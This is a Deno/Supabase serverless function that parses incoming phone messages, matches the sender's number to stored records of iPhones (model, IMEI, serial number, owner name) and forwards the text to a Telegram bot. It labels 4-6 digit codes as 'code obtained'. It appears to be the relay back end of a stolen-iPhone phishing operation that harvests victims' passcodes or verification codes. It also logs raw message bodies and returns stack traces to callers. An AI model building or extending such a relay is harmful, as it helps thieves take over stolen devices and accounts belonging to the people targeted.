
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface NotificationData {
  NotificationTitle?: string;
  NotificationMessage?: string;
  message?: string;
  sender?: string;
  response?: string;
}

serve(async (req) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] 🚀 STARTING telegram-notification request - ${req.method}`);
  
  if (req.method === 'OPTIONS') {
    console.log('✅ Handling CORS preflight request');
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('📝 Processing notification request...');
    
    let requestData: NotificationData = { NotificationTitle: '', NotificationMessage: '' };
    
    try {
      const body = await req.text();
      console.log(`📥 Raw request body received: "${body}"`);
      console.log(`📋 Content-Type: ${req.headers.get('content-type')}`);
      console.log(`🌐 User-Agent: ${req.headers.get('user-agent')}`);
      console.log(`🔍 Request URL: ${req.url}`);
      console.log(`🔑 Authorization header: ${req.headers.get('authorization') ? 'Present' : 'Missing'}`);
      console.log(`📏 Body length: ${body.length} characters`);
      
      if (!body || body.trim() === '') {
        console.error('❌ Empty request body received');
        return new Response(
          JSON.stringify({ 
            success: false, 
            error: 'Empty request body',
            message: 'No se recibió contenido en la solicitud',
            timestamp
          }), 
          { 
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 400
          }
        );
      }

      // Intentar parsear como JSON primero
      try {
        requestData = JSON.parse(body);
        console.log('✅ Successfully parsed as JSON:', requestData);
      } catch (jsonError) {
        console.log('⚠️ Failed to parse as JSON, trying text extraction...');
        
        // Verificar si son variables de IFTTT que no se reemplazaron
        if (body.includes('{{NotificationTitle}}') || body.includes('{{NotificationMessage}}')) {
          console.error('❌ Detected IFTTT template variables that weren\'t replaced');
          return new Response(
            JSON.stringify({ 
              success: false, 
              error: 'IFTTT template error',
              message: 'Las variables de IFTTT no se reemplazaron correctamente. Verifica tu configuración de IFTTT.',
              received_body: body,
              timestamp
            }), 
            { 
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 400
            }
          );
        }
        
        // Patrones ULTRA mejorados para extraer teléfono y mensaje
        const patterns = [
          // Patrón internacional completo con + y espacios
          /^(\+\d{1,4}[\s\-]?\d{2,4}[\s\-]?\d{3,4}[\s\-]?\d{3,4})\s+(.+)$/s,
          // Patrón números largos sin +
          /^(\d{10,15})\s+(.+)$/s,
          // Patrón con código de país separado
          /^(\+?\d{1,4})\s+(\d{8,12})\s+(.+)$/s,
          // Patrón más flexible con múltiples espacios
          /^([+\d\s\-\(\)]{8,25}?)\s{2,}(.+)$/s,
          // Patrón para números cortos problemáticos
          /^(\+\d{1,4})\s+(.+)$/s,
          // Patrón fallback muy permisivo
          /^([+\d\s\-\(\)]{5,20})\s+(.+)$/s
        ];
        
        let matched = false;
        
        for (const pattern of patterns) {
          const match = body.trim().match(pattern);
          if (match) {
            console.log(`📞 Pattern matched: ${pattern.source}`);
            if (match.length === 3) {
              // Patrón simple: teléfono + mensaje
              requestData = {
                NotificationTitle: match[1].trim(),
                NotificationMessage: match[2].trim().replace(/\s+/g, ' ')
              };
            } else if (match.length === 4) {
              // Patrón con código de país: código + teléfono + mensaje
              requestData = {
                NotificationTitle: `${match[1].trim()}${match[2].trim()}`,
                NotificationMessage: match[3].trim().replace(/\s+/g, ' ')
              };
            }
            console.log('✅ Extracted data:', requestData);
            matched = true;
            break;
          }
        }
        
        if (!matched) {
          console.log('⚠️ No pattern matched, trying enhanced fallback extraction...');
          // Estrategia de fallback mejorada
          const lines = body.trim().split(/[\r\n]+/);
          const firstLine = lines[0]?.trim();
          const restLines = lines.slice(1).join(' ').trim();
          
          if (firstLine && restLines) {
            requestData = {
              NotificationTitle: firstLine,
              NotificationMessage: restLines.replace(/\s+/g, ' ')
            };
            console.log('🔄 Enhanced fallback extraction result:', requestData);
          } else {
            // Último recurso: dividir por espacios múltiples
            const parts = body.trim().split(/\s{2,}/);
            if (parts.length >= 2) {
              requestData = {
                NotificationTitle: parts[0].trim(),
                NotificationMessage: parts.slice(1).join(' ').trim()
              };
            } else {
              // División por espacio simple como último recurso
              const simpleParts = body.trim().split(/\s+/);
              if (simpleParts.length >= 2) {
                requestData = {
                  NotificationTitle: simpleParts[0],
                  NotificationMessage: simpleParts.slice(1).join(' ')
                };
              } else {
                requestData = {
                  NotificationTitle: 'Unknown',
                  NotificationMessage: body.trim()
                };
              }
            }
            console.log('🔄 Final fallback extraction result:', requestData);
          }
        }
      }
    } catch (parseError: unknown) {
      console.error('❌ Critical error parsing request body:', parseError);
      const pErr = parseError instanceof Error ? parseError : new Error(String(parseError));
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid request format',
          message: 'Formato de solicitud inválido. Debe ser JSON o texto plano.',
          details: pErr.message,
          timestamp
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }
    
    console.log('📋 Final parsed notification data:', requestData);

    const phoneNumber = requestData.NotificationTitle || '';
    const messageText = requestData.NotificationMessage || requestData.message || '';
    
    console.log(`📞 Processing - Phone: "${phoneNumber}" | Message: "${messageText}" | Length: ${messageText.length}`);

    // Validación mejorada del número de teléfono
    const cleanPhoneForValidation = phoneNumber.replace(/\D/g, '');
    if (!phoneNumber || phoneNumber.trim() === '' || phoneNumber === 'Unknown' || cleanPhoneForValidation.length < 5) {
      console.error('❌ Invalid phone number detected:', phoneNumber);
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Invalid phone number',
          message: `Número de teléfono inválido: "${phoneNumber}". Debe tener al menos 5 dígitos.`,
          received_data: requestData,
          timestamp
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // Validar que hay mensaje
    if (!messageText || messageText.trim() === '') {
      console.error('❌ No message content found');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'No message content',
          message: 'No se encontró contenido del mensaje',
          received_data: requestData,
          timestamp
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    console.log('✅ Validation passed - proceeding with database lookup');

    // Configurar cliente Supabase
    const supabaseUrl = Deno.env.get('SUPABASE_URL');
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY');
    
    if (!supabaseUrl || !supabaseKey) {
      console.error('❌ Missing Supabase environment variables');
      throw new Error('Missing Supabase configuration');
    }
    
    console.log('🔗 Connecting to Supabase...');
    const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Limpiar y normalizar número de teléfono
    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)\.]/g, '');
    console.log(`🧹 Cleaned phone number: "${cleanPhoneNumber}"`);

    // Función SÚPER mejorada para generar patrones de búsqueda
    const generateSearchPatterns = (phone: string) => {
      const patterns = new Set<string>();
      const clean = phone.replace(/[\s\-\(\)\.]/g, '');
      
      // Agregar número original y limpio
      patterns.add(phone);
      patterns.add(clean);
      
      // Variantes con/sin +
      if (clean.startsWith('+')) {
        patterns.add(clean.substring(1));
      } else {
        patterns.add('+' + clean);
      }
      
      // Solo dígitos para análisis
      const onlyDigits = clean.replace(/\D/g, '');
      
      // Patrones específicos ULTRA mejorados para países problemáticos
      const countryMappings = {
        '593': { lengths: [9, 10], name: 'Ecuador', variations: ['0'] },
        '52': { lengths: [10, 11, 12], name: 'México', variations: ['1', '0'] },
        '57': { lengths: [10, 11, 12], name: 'Colombia', variations: ['0'] },
        '1': { lengths: [10, 11], name: 'USA/Canadá', variations: [] },
        '54': { lengths: [10, 11, 12], name: 'Argentina', variations: ['9'] },
        '55': { lengths: [10, 11, 12], name: 'Brasil', variations: [] },
        '34': { lengths: [9], name: 'España', variations: [] },
        '505': { lengths: [8], name: 'Nicaragua', variations: [] },
        '506': { lengths: [8], name: 'Costa Rica', variations: [] },
        '507': { lengths: [8], name: 'Panamá', variations: [] },
        '51': { lengths: [9], name: 'Perú', variations: [] },
        '56': { lengths: [9], name: 'Chile', variations: [] },
        '58': { lengths: [10, 11], name: 'Venezuela', variations: ['0'] },
        '503': { lengths: [8], name: 'El Salvador', variations: [] },
        '502': { lengths: [8], name: 'Guatemala', variations: [] },
        '504': { lengths: [8], name: 'Honduras', variations: [] },
      };
      
      // Detectar país y generar TODAS las variantes posibles
      let detectedCountry = null;
      for (const [countryCode, config] of Object.entries(countryMappings)) {
        if (onlyDigits.startsWith(countryCode)) {
          detectedCountry = { code: countryCode, config };
          break;
        }
      }
      
      if (detectedCountry) {
        const { code: countryCode, config } = detectedCountry;
        const withoutCountry = onlyDigits.substring(countryCode.length);
        
        console.log(`🏁 Detected country: ${config.name} (${countryCode}), local number: ${withoutCountry}`);
        
        // Generar TODAS las combinaciones posibles
        const allVariants = new Set<string>();
        
        // Variantes básicas
        allVariants.add(withoutCountry);
        allVariants.add(countryCode + withoutCountry);
        allVariants.add('+' + countryCode + withoutCountry);
        
        // Variantes con prefijos específicos del país
        for (const variation of config.variations) {
          if (!withoutCountry.startsWith(variation)) {
            allVariants.add(variation + withoutCountry);
            allVariants.add(countryCode + variation + withoutCountry);
            allVariants.add('+' + countryCode + variation + withoutCountry);
          }
          
          // También quitar el prefijo si ya existe
          if (withoutCountry.startsWith(variation)) {
            const withoutPrefix = withoutCountry.substring(variation.length);
            allVariants.add(withoutPrefix);
            allVariants.add(countryCode + withoutPrefix);
            allVariants.add('+' + countryCode + withoutPrefix);
          }
        }
        
        // Variantes de longitud
        for (const len of config.lengths) {
          if (withoutCountry.length >= len) {
            const lengthVariant = withoutCountry.slice(-len);
            allVariants.add(lengthVariant);
            allVariants.add(countryCode + lengthVariant);
            allVariants.add('+' + countryCode + lengthVariant);
            
            // Con variaciones del país
            for (const variation of config.variations) {
              if (!lengthVariant.startsWith(variation)) {
                allVariants.add(variation + lengthVariant);
                allVariants.add(countryCode + variation + lengthVariant);
                allVariants.add('+' + countryCode + variation + lengthVariant);
              }
            }
          }
        }
        
        // Agregar todas las variantes generadas
        for (const variant of allVariants) {
          patterns.add(variant);
        }
      }
      
      // Patrones de longitud genéricos para casos no detectados
      if (onlyDigits.length >= 7) {
        for (let i = 7; i <= Math.min(onlyDigits.length, 15); i++) {
          const suffix = onlyDigits.slice(-i);
          patterns.add(suffix);
          if (!suffix.startsWith('+')) {
            patterns.add('+' + suffix);
          }
        }
      }
      
      return Array.from(patterns).filter(p => p && p.replace(/\D/g, '').length >= 5);
    };

    const searchPatterns = generateSearchPatterns(cleanPhoneNumber);
    console.log(`🔍 Generated ${searchPatterns.length} search patterns for enhanced search`);

    let matchedProcess = null;
    let matchedPattern = '';

    // ESTRATEGIA 1: Búsqueda directa mejorada (SÚPER AGRESIVA)
    console.log('🎯 STRATEGY 1: Enhanced direct search with country_code + phone_number...');
    
    // Obtener TODOS los procesos con configuración de Telegram
    const { data: allProcesses, error: allError } = await supabase
      .from('processes')
      .select(`
        id,
        user_id,
        client_name,
        iphone_model,
        imei,
        serial_number,
        owner_name,
        country_code,
        phone_number,
        profiles!inner(telegram_bot_token, telegram_chat_id)
      `)
      .not('profiles.telegram_bot_token', 'is', null)
      .not('profiles.telegram_chat_id', 'is', null)
      .limit(1000);

    if (allError) {
      console.error('❌ Database query error:', allError);
    }

    if (allProcesses && allProcesses.length > 0) {
      console.log(`🔍 Checking ${allProcesses.length} processes with Telegram configured...`);
      
      for (const proc of allProcesses) {
        // Construir el número completo del proceso
        const procCountryCode = (proc.country_code || '').replace(/[\s\-\(\)\.]/g, '');
        const procPhoneNumber = (proc.phone_number || '').replace(/[\s\-\(\)\.]/g, '');
        const procFullNumber = procCountryCode + procPhoneNumber;
        const procFullNumberDigits = procFullNumber.replace(/\D/g, '');
        
        // Generar variantes del número del proceso
        const procVariants = [
          proc.phone_number,
          procPhoneNumber,
          procFullNumber,
          procFullNumber.replace(/\+/g, ''),
          procFullNumberDigits,
          '+' + procFullNumberDigits,
          // Sin el 0 inicial si lo tiene (común en varios países)
          procPhoneNumber.startsWith('0') ? procPhoneNumber.substring(1) : null,
          procPhoneNumber.startsWith('0') ? procCountryCode + procPhoneNumber.substring(1) : null,
          procPhoneNumber.startsWith('0') ? procCountryCode.replace(/\+/g, '') + procPhoneNumber.substring(1) : null,
        ].filter(Boolean);
        
        // Comparar contra TODOS los patrones de búsqueda
        for (const pattern of searchPatterns) {
          const patternDigits = pattern.replace(/\D/g, '');
          
          for (const variant of procVariants) {
            const variantDigits = (variant || '').replace(/\D/g, '');
            
            // Comparación flexible con múltiples estrategias
            if (
              // Coincidencia exacta
              variant === pattern ||
              variantDigits === patternDigits ||
              // Coincidencia de sufijos (últimos 7-10 dígitos)
              (patternDigits.length >= 7 && variantDigits.length >= 7 && 
               patternDigits.slice(-7) === variantDigits.slice(-7)) ||
              (patternDigits.length >= 8 && variantDigits.length >= 8 && 
               patternDigits.slice(-8) === variantDigits.slice(-8)) ||
              (patternDigits.length >= 9 && variantDigits.length >= 9 && 
               patternDigits.slice(-9) === variantDigits.slice(-9)) ||
              (patternDigits.length >= 10 && variantDigits.length >= 10 && 
               patternDigits.slice(-10) === variantDigits.slice(-10)) ||
              // Contiene o es contenido
              (variantDigits.includes(patternDigits) && patternDigits.length >= 7) ||
              (patternDigits.includes(variantDigits) && variantDigits.length >= 7)
            ) {
              matchedProcess = proc;
              matchedPattern = pattern;
              console.log(`✅ MATCH FOUND: pattern="${pattern}" (${patternDigits}) matched variant="${variant}" (${variantDigits}) -> ${proc.client_name} (${procCountryCode}${procPhoneNumber})`);
              break;
            }
          }
          if (matchedProcess) break;
        }
        if (matchedProcess) break;
      }
    }


    // Verificar si se encontró un proceso
    if (!matchedProcess) {
      console.error('❌ NO MATCHING PROCESS FOUND after exhaustive search');
      console.log('🔍 Search summary:', {
        original_phone: phoneNumber,
        cleaned_phone: cleanPhoneNumber,
        patterns_tried: searchPatterns.length,
        message_preview: messageText.substring(0, 100)
      });
      
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Process not found',
          message: `❌ No se encontró un proceso con el número: ${cleanPhoneNumber}`,
          phone_searched: cleanPhoneNumber,
          patterns_tried: searchPatterns,
          timestamp
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 404
        }
      );
    }

    const process = matchedProcess;
    const profile: any = process.profiles;

    
    console.log('✅ PROCESS FOUND:', {
      process_id: process.id,
      client_name: process.client_name,
      iphone_model: process.iphone_model,
      imei: process.imei,
      serial_number: process.serial_number,
      owner_name: process.owner_name,
      user_id: process.user_id,
      matched_pattern: matchedPattern,
      has_bot_token: !!profile.telegram_bot_token,
      has_chat_id: !!profile.telegram_chat_id,
      full_process: process
    });

    console.log('📞 PARSED PHONE AND MESSAGE:', {
      original_phone: phoneNumber,
      original_message: messageText,
      phone_length: phoneNumber.length,
      message_length: messageText.length
    });

    // Verificar configuración de Telegram
    if (!profile.telegram_bot_token || !profile.telegram_chat_id) {
      console.error('❌ User has not configured Telegram bot');
      return new Response(
        JSON.stringify({ 
          success: false, 
          error: 'Telegram not configured',
          message: 'El usuario no ha configurado su bot de Telegram correctamente',
          process_id: process.id,
          client_name: process.client_name,
          timestamp
        }), 
        { 
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400
        }
      );
    }

    // Análisis CORREGIDO del mensaje para códigos de 4-6 dígitos
    const messageAnalysis = analyzeMessage(messageText);
    console.log('📊 Message analysis:', messageAnalysis);

    // Construir mensaje de notificación
    const notificationMessage = buildNotificationMessage(process, phoneNumber, messageText, messageAnalysis);
    console.log(`📝 Built notification message (${notificationMessage.length} chars)`);

    // Enviar a Telegram con sistema de reintentos robusto
    console.log('🚀 Sending notification to Telegram...');
    
    const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
    const maxRetries = 7;
    let attempt = 0;
    let telegramResult = null;
    
    while (attempt < maxRetries) {
      attempt++;
      console.log(`📤 Telegram send attempt ${attempt}/${maxRetries}`);
      
      try {
        const telegramResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: profile.telegram_chat_id,
            text: notificationMessage,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          }),
        });

        telegramResult = await telegramResponse.json();
        
        if (telegramResponse.ok && telegramResult.ok) {
          console.log(`✅ Notification sent successfully on attempt ${attempt}`);
          break;
        } else {
          console.error(`❌ Telegram API error on attempt ${attempt}:`, telegramResult);
          
          if (attempt === maxRetries) {
            console.error('❌ All Telegram send attempts failed');
            return new Response(
              JSON.stringify({ 
                success: false, 
                error: 'Failed to send Telegram message after all retries',
                details: telegramResult,
                attempts: attempt,
                process_info: {
                  id: process.id,
                  client_name: process.client_name,
                  user_id: process.user_id
                },
                timestamp
              }), 
              { 
                headers: { ...corsHeaders, 'Content-Type': 'application/json' },
                status: 500
              }
            );
          }
          
          const waitTime = Math.min(1000 * Math.pow(2, attempt - 1), 15000);
          console.log(`⏳ Waiting ${waitTime}ms before retry...`);
          await new Promise(resolve => setTimeout(resolve, waitTime));
        }
      } catch (fetchError) {
        console.error(`❌ Network error on attempt ${attempt}:`, fetchError);
        
        if (attempt === maxRetries) {
          console.error('❌ All network attempts failed');
          return new Response(
            JSON.stringify({ 
              success: false, 
              error: 'Network error sending to Telegram after all retries',
              details: fetchError.message,
              attempts: attempt,
              timestamp
            }), 
            { 
              headers: { ...corsHeaders, 'Content-Type': 'application/json' },
              status: 500
            }
          );
        }
        
        const waitTime = Math.min(2000 * attempt, 15000);
        console.log(`⏳ Waiting ${waitTime}ms after network error...`);
        await new Promise(resolve => setTimeout(resolve, waitTime));
      }
    }

    console.log('🎉 NOTIFICATION PROCESS COMPLETED SUCCESSFULLY');

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: '✅ Notification sent successfully',
        process_id: process.id,
        user_id: process.user_id,
        client_name: process.client_name,
        phone_number: cleanPhoneNumber,
        matched_pattern: matchedPattern,
        message_type: messageAnalysis.type,
        code_length: messageAnalysis.codeLength,
        attempts_used: attempt,
        timestamp
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200
      }
    );

  } catch (error) {
    console.error('💥 CRITICAL ERROR processing notification:', error);
    console.error('🔍 Error stack:', error.stack);
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: 'Internal server error',
        details: error.message,
        stack: error.stack,
        timestamp: new Date().toISOString()
      }), 
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500
      }
    );
  }
});

// Función CORREGIDA para analizar el tipo de mensaje
function analyzeMessage(message: string) {
  const trimmed = message.trim();
  const isNumeric = /^\d+$/.test(trimmed);
  const length = trimmed.length;
  
  // CORRECCIÓN: códigos de 4-6 dígitos deben ser "code_obtained"
  return {
    type: isNumeric ? 
      (length >= 4 && length <= 6 ? 'code_obtained' : 
       length >= 1 && length <= 8 ? 'verification_code' : 'regular_message') : 
      'regular_message',
    codeLength: isNumeric ? length : null,
    isCode: isNumeric && length >= 1 && length <= 8
  };
}

// Función para construir el mensaje de notificación
function buildNotificationMessage(process: any, phoneNumber: string, messageText: string, analysis: any) {
  const isCodeObtained = analysis.type === 'code_obtained';
  const isVerificationCode = analysis.type === 'verification_code';
  
  return `🔔 Nuevo mensaje WhatsApp recibido

📊 INFORMACIÓN DEL PROCESO:
👤 Cliente: ${process.client_name || 'No especificado'}
📱 Modelo: ${process.iphone_model || 'No especificado'}
📞 IMEI: ${process.imei || 'No especificado'}
🔢 Serie: ${process.serial_number || 'No especificado'}
${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}

📞 Remitente: ${phoneNumber}
${isCodeObtained ? 
    `🔐 CÓDIGO OBTENIDO: ${messageText} (${analysis.codeLength} dígitos)` : 
    (isVerificationCode ? 
      `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText} (${analysis.codeLength} dígitos)` :
      `📥 Mensaje: ${messageText}`)
}`;
}
